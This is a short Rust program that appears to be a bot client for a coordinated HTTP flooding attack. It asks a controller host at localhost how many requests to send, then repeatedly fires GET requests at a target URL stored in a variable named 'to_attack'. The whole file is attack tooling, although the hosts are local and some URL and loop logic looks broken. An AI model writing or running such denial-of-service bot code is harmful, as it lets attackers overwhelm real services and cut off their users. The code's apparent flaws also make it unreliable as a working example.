struct Client {
    host_address: String,
    address: String,
    no_requests: i32,
}

impl Client {
    fn new(host: String, addr: String, req: i32) -> Client {
        let mut cl = Client { host_address: host, address: addr, no_requests: req };
        cl.host_address.push_str("/api/get_requests");
        return cl;
    }

    fn get_requests_no(&mut self) {
        let url = self.host_address.as_str();
        let value = reqwest::blocking::get(url).unwrap().text().unwrap();
        self.no_requests = value.parse().unwrap();
    }

    fn check_requests(&mut self) -> bool {
        if self.no_requests % 20 == 0 {
            let url = format!("{}/get_request", self.host_address);
            let value = reqwest::blocking::get(&url).unwrap().text().unwrap();
            let remaining_requests: i32 = value.parse().unwrap();
            if remaining_requests < 20 {
                self.no_requests = remaining_requests;
                return false;
            }
        }
        true
    }

    fn start_requesting(&mut self) {
        while self.no_requests > 0 {
            let can_continue = self.check_requests();
            let to_attack = self.address.as_str();
            if !can_continue {
                break;
            }
            let _ = reqwest::blocking::get(to_attack);
            self.no_requests -= 1;
        }
    }




    fn run(&mut self) {
        loop {
            match self.no_requests {
                0 => self.get_requests_no(),
                _ => self.start_requesting(),
            };
        }
    }
}

fn main() {
    let mut cl = Client::new(String::from("http://localhost:8080"), String::from("http://0.0.0.0:8000"), 15);
    cl.run();

}
